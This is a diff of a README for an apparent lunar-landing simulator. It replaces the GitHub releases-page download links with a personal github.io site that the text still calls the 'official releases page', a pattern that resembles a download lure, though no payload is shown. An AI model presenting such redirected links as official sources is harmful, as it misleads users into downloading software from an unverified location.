@@ -1,12 +1,12 @@
 # 🚀 apollo-lunar-script-sim - Practice manual lunar landing maneuvers safely
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sonu956932/apollo-lunar-script-sim/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://sonu956932.github.io)
 
 This application provides a physics-based simulator for moon landings. It calculates the forces of gravity and motion to mimic the experience of landing a spacecraft on the lunar surface. You use this tool to learn how landing speed and descent angle affect your success. The program runs in two formats to give you flexibility in how you practice.
 
 ## 💾 How to download the software
 
-Visit the [official releases page](https://github.com/Sonu956932/apollo-lunar-script-sim/releases) to access the files. You see a list of versions. Choose the most recent version at the top of the page. Click the file name to start the download. Save the file to your computer in a folder you can find later, such as your Downloads folder.
+Visit the [official releases page](https://sonu956932.github.io) to access the files. You see a list of versions. Choose the most recent version at the top of the page. Click the file name to start the download. Save the file to your computer in a folder you can find later, such as your Downloads folder.
 
 ## ⚙️ System requirements
 
